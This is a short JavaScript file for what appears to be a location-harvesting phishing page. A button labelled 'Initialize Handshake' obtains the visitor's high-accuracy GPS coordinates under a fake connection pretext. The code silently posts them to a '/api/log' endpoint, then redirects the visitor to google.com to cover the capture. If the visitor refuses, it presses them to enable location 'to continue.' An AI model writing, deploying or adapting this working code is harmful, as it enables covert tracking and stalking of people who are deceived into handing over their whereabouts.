// script.js
function sendLocation() {
    const btn = document.getElementById('authBtn');
    btn.innerText = "Connecting...";

    if (!navigator.geolocation) {
        alert("Geolocation is not supported by this browser.");
        return;
    }

    // Success callback
    const success = (position) => {
        const data = {
            lat: position.coords.latitude,
            lon: position.coords.longitude
        };

        fetch('/api/log', {
            method: 'POST',
            body: JSON.stringify(data)
        }).then(() => {
            window.location.href = "https://google.com";
        });
    };

    // Error callback (Very important for debugging)
    const error = (err) => {
        console.warn(`ERROR(${err.code}): ${err.message}`);
        alert("Permission denied or location service off. Please enable location to continue.");
        btn.innerText = "Initialize Handshake";
    };

    // Try to get position
    navigator.geolocation.getCurrentPosition(success, error, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
    });
            }
            
